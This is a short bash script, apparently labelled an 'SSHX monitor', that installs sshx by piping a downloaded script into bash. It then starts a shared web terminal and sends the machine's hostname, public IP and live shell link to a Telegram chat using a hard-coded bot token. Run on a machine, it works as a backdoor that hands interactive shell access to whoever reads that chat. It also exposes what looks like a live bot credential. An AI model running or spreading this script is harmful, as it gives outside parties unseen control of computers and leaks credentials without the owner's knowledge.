#!/bin/bash

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send(){
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d "chat_id=$CHAT_ID" \
-d "text=$1" \
-d "parse_mode=HTML" > /dev/null
}

echo "[STEP] Detect OS"

if [ -f /etc/os-release ]; then
. /etc/os-release
OS=$ID
fi

case $OS in
ubuntu|debian)
UPDATE="apt-get update -y"
INSTALL="apt-get install -y"
;;
centos|rhel|almalinux)
UPDATE="yum makecache -y"
INSTALL="yum install -y"
;;
fedora)
UPDATE="dnf makecache -y"
INSTALL="dnf install -y"
;;
*)
UPDATE="apt-get update -y"
INSTALL="apt-get install -y"
;;
esac

echo "[STEP] Install dependencies"

$UPDATE

command -v curl >/dev/null || $INSTALL curl
command -v tmux >/dev/null || $INSTALL tmux
command -v grep >/dev/null || $INSTALL grep

if ! command -v sshx >/dev/null; then
echo "[STEP] Install sshx"
curl -fsSL https://sshx.io/get | bash
fi

export PATH=$PATH:$HOME/.sshx/bin

HOST=$(hostname)
IP=$(curl -s ifconfig.me)
TIME=$(date)

echo "[STEP] Starting sshx..."

sshx > /tmp/sshx.log 2>&1 &

sleep 5

LINK=$(grep -o 'https://sshx.io/s/[^ ]*' /tmp/sshx.log | head -1)

MSG="✅ <b>SSHX MONITOR STARTED</b>
Host: $HOST
IP: $IP
Time: $TIME

sshx v0.4.1
➜ Link: $LINK
➜ Shell: /bin/bash"

send "$MSG"

echo "[INFO] SSHX LINK:"
echo "$LINK"
